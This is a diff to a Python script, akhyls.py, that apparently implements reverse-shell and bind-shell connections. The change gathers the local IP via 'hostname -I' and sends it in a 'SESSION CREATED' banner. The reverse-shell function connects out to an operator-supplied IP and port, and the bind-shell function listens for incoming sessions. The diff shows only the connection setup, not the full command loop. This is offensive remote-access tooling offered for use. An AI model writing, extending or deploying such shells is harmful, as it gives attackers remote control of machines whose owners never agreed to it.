@@ -17,10 +17,13 @@ Usage ./akhyls.py --v <Ip> <PORT>
 
 def rvrscnnct(ip,port):
     try:
+        output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
+        a=output.stdout.read()
+        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",str(a))[0]
         rvrscnct=socket.socket()
         rvrscnct.connect((ip,int(port)))
         rvrscnct.settimeout(2)
-        host=str.encode('[*] SESSION CREATED '+socket.gethostbyname(socket.gethostname()))
+        host=str.encode('[*] SESSION CREATED '+ip_candidates)
         rvrscnct.send(host)
         while True:
             try:
@@ -65,7 +68,7 @@ def bndcnnct(port):
         bindshell.bind((ip_candidates,int(port)))
         bindshell.listen(2)
         a,b=bindshell.accept()
-        host=str.encode('[*] SESSION CREATED '+socket.gethostbyname(socket.gethostname()))
+        host=str.encode('[*] SESSION CREATED '+ip_candidates)
         a.send(host)
         a.settimeout(2)
         while True:
